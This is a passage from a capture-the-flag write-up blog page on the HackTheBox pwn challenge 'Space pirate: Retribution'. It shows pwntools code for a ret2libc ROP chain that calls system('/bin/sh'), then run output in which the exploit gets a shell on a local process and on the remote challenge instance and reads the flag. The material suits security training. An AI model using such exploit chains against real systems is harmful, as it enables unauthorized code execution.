<span class="code-yellow">                     ‚ñë‚ñí‚ñí  ‚ñì      ‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñí                     ‚ñí</span>
<span class="code-yellow">                   ‚ñë‚ñí‚ñí                                              ‚ñì</span>
<span class="code-yellow">                  ‚ñí‚ñí‚ñí       ‚ñí‚ñí</span>
<span class="code-yellow">                ‚ñë‚ñí‚ñí‚ñë      ‚ñí‚ñí‚ñë       ‚ñë</span>
<span class="code-yellow">               ‚ñë‚ñí‚ñí‚ñë   ‚ñë‚ñí‚ñí‚ñí‚ñë         ‚ñë</span>
<span class="code-yellow">              ‚ñë‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë            ‚ñí</span>
<span class="code-yellow">             ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë</span>
<span class="code-yellow">            ‚ñë‚ñí‚ñí‚ñí‚ñí</span>
<span class="code-yellow">           ‚ñë‚ñë                                               ‚ñí</span>



<span class="code-blue">1. Show missiles üöÄ</span>
<span class="code-blue">2. Change target's location üéØ</span>
<span class="code-blue">&gt;&gt; <span class="code-red">$</span></span>
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>Now, we can perform the ret2libc attack by calling <code>system("/bin/sh")</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.rdi[</span><span class="mtk6">0</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk8">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[*] Insert new coordinates:'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'y = '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'AAAAAAA'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[*] Verify new coordinates? (y/n): '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './sp_retribution'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './sp_retribution': pid 2467854  
[<span class="code-green">+</span>] ELF base address: 0x563151200000
[<span class="code-blue">*</span>] Loaded 14 cached gadgets for 'sp_retribution'
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f4451cef6a0
[<span class="code-green">+</span>] Glibc base address: 0x7f4451c80000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt  glibc  solve.py  sp_retribution
</code></pre></div><p>And we have a local shell.</p><h2 id="flag">Flag</h2><p>Let&rsquo;s run the exploit in the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 161.35.162.182:31897
[<span class="code-blue">*</span>] './sp_retribution'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Opening connection to 161.35.162.182 on port 31897: Done  
[<span class="code-green">+</span>] ELF base address: 0x56049ec00000
[<span class="code-blue">*</span>] Loaded 14 cached gadgets for 'sp_retribution'
[<span class="code-blue">*</span>] Leaked puts() address: 0x7fd09ff4c6a0
[<span class="code-green">+</span>] Glibc base address: 0x7fd09fedd000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
glibc
sp_retribution
<span class="code-red">$</span> cat flag.txt
HTB{w3_f1n4lly_m4d3_1t}
</code></pre></div><p>The full exploit script can be found in here: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Space%20pirate:%20Retribution/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#pie-bypass">PIE bypass</a></li><li><a href="#leaking-glibc-addresses">Leaking Glibc addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>